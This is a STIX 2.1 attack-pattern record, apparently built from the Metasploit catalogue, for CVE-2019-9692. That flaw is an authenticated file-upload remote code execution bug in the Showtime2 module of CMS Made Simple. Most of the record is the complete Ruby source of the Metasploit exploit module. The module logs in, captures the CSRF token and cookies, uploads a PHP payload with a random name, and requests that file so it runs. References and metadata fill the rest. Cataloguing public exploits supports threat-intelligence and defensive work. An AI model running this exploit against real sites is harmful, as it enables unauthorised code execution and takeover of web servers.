{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fef2e9f2-7804-4eaa-8b38-d7a62d8b24cf",
    "created": "2024-08-14T17:11:14.568111Z",
    "modified": "2024-08-14T17:11:14.568115Z",
    "name": "\"CMS Made Simple (CMSMS) Showtime2 File Upload RCE\"",
    "description": "( This module exploits a File Upload vulnerability that lead in a RCE in Showtime2 module (<= 3.6.2) in CMS Made Simple (CMSMS). An authenticated user with \"Use Showtime2\" privilege could exploit the vulnerability.  The vulnerability exists in the Showtime2 module, where the class \"class.showtime2_image.php\" does not ensure that a watermark file has a standard image file extension (GIF, JPG, JPEG, or PNG).  Tested on Showtime2 3.6.2, 3.6.1, 3.6.0, 3.5.4, 3.5.3, 3.5.2, 3.5.1, 3.5.0 3.4.5, 3.4.3, 3.4.2 on CMS Made Simple (CMSMS) 2.2.9.1 ) 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/cmsms_showtime2_rce.rb",
            "external_id": "cmsms_showtime2_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-9692"
        },
        {
            "source_name": "reference",
            "url": "https://forum.cmsmadesimple.org/viewtopic.php?f=1&t=80285"
        },
        {
            "source_name": "reference",
            "url": "http://viewsvn.cmsmadesimple.org/diff.php?repname=showtime2&path=%2Ftrunk%2Flib%2Fclass.showtime2_image.php&rev=47"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => \"CMS Made Simple (CMSMS) Showtime2 File Upload RCE\",\n      'Description' => %q(\n        This module exploits a File Upload vulnerability that lead in a RCE in\n        Showtime2 module (<= 3.6.2) in CMS Made Simple (CMSMS). An authenticated\n        user with \"Use Showtime2\" privilege could exploit the vulnerability.\n\n        The vulnerability exists in the Showtime2 module, where the class\n        \"class.showtime2_image.php\" does not ensure that a watermark file\n        has a standard image file extension (GIF, JPG, JPEG, or PNG).\n\n        Tested on Showtime2 3.6.2, 3.6.1, 3.6.0, 3.5.4, 3.5.3, 3.5.2, 3.5.1, 3.5.0,\n        3.4.5, 3.4.3, 3.4.2 on CMS Made Simple (CMSMS) 2.2.9.1\n      ),\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'Daniele Scanu', # Discovery & PoC\n          'Fabio Cogno' # Metasploit module\n        ],\n      'References' =>\n        [\n          ['CVE', '2019-9692'],\n          ['CWE', '434'],\n          ['EDB', '46546'],\n          ['URL', 'https://forum.cmsmadesimple.org/viewtopic.php?f=1&t=80285'],\n          ['URL', 'http://viewsvn.cmsmadesimple.org/diff.php?repname=showtime2&path=%2Ftrunk%2Flib%2Fclass.showtime2_image.php&rev=47']\n        ],\n      'Platform' => 'php',\n      'Arch' => ARCH_PHP,\n      'Targets' => [['Automatic', {}]],\n      'Privileged' => false,\n      'DisclosureDate' => '2019-03-11',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, \"Base CMS Made Simple directory path\", '/']),\n        OptString.new('USERNAME', [true, \"Username to authenticate with\", '']),\n        OptString.new('PASSWORD', [false, \"Password to authenticate with\", ''])\n      ]\n    )\n  end\n\n  def do_login\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'login.php'),\n      'vars_post' => {\n        'username' => datastore['username'],\n        'password' => datastore['password'],\n        'loginsubmit' => 'Submit'\n      }\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    if res.code == 302\n      @csrf_name = res.headers['Location'].scan(/([^?=&]+)[=([^&]*)]?/).flatten[-2].to_s\n      @csrf_value = res.headers['Location'].scan(/([^?=&]+)[=([^&]*)]?/).flatten[-1].to_s\n      @cookies = res.get_cookies\n      return\n    end\n\n    fail_with(Failure::NoAccess, 'Authentication was unsuccessful')\n  end\n\n  def upload(fname, fcontent)\n    # construct POST data\n    data = Rex::MIME::Message.new\n    data.add_part('Showtime2,m1_,defaultadmin,0', nil, nil, \"form-data; name=\\\"mact\\\"\")\n    data.add_part('Upload', nil, nil, \"form-data; name=\\\"m1_upload_submit\\\"\")\n    data.add_part(@csrf_value, nil, nil, \"form-data; name=\\\"#{@csrf_name}\\\"\")\n    data.add_part(fcontent, 'text/plain', nil, \"from-data; name=\\\"m1_input_browse\\\"; filename=\\\"#{fname}\\\"\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'admin', 'moduleinterface.php'),\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data.to_s,\n      'headers' => {\n        'Cookie' => @cookies\n      }\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    if res.code == 200 && (res.body =~ /#{Regexp.escape(fname)}/i || res.body =~ /id=\"showoverview\"/i)\n      return\n    end\n\n    print_warning('No confidence in PHP payload success or failure')\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'modules', 'Showtime2', 'moduleinfo.ini')\n    )\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    if res.code == 200\n      module_version = Rex::Version.new(res.body.scan(/^version = \"?(\\d\\.\\d\\.\\d)\"?/).flatten.first)\n      if module_version < Rex::Version.new('3.6.3')\n        # Showtime2 module is uploaded and present on \"Module Manager\" section but it could be NOT installed.\n        vprint_status(\"Showtime2 version: #{module_version}\")\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    unless Exploit::CheckCode::Appears == check\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n\n    @csrf_name = nil\n    @csrf_value = nil\n    @cookies = nil\n\n    do_login\n\n    # Upload PHP payload\n    fname = \"#{rand_text_alphanumeric(3..9)}.php\"\n    fcontent = \"<?php #{payload.encode} ?>\"\n    print_status('Uploading PHP payload.')\n    upload(fname, fcontent)\n\n    # Register uploaded PHP payload file for cleanup\n    register_files_for_cleanup('./' + fname)\n\n    # Retrieve and execute PHP payload\n    print_status(\"Making request for '/#{fname}' to execute payload.\")\n    send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'uploads', 'images', fname)\n      },\n      15\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-11",
    "x_mitre_platforms": [
        "php'"
    ]
}